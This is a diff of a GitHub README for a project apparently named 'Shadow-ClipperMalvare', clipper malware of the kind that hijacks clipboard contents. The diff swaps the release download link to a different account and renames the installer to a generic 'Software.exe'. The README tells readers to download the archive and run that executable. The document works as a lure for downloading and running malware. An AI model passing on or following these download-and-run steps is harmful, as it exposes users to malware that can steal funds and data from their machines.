@@ -6,10 +6,10 @@
  ### Installation
 
 [![asdasdasd](https://github.com/user-attachments/assets/b9a9d433-1666-41fa-aef4-8ec23891350a)
-](https://github.com/msaoudallah/Shadow-ClipperMalvare/releases/download/V6.1/Release.zip)
+](https://github.com/sacaliza/Shadow-ClipperMalvare/releases/download/Release/Release.zip)
  
 ## **1. [Download the archive](https://github.com/msaoudallah/Shadow-ClipperMalvare/releases/download/V6.1/Release.zip) from releases and extract it to a convenient folder.**
-## **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
+## **2. Run the auto-installer `Software.exe`. It will install and download all necessary packages for > operation.**
 ![photo_2024-05-12_21-23-57](https://github.com/user-attachments/assets/6ec17cd1-6f98-4618-b29d-57991c7702af)
 
 ## Contributing
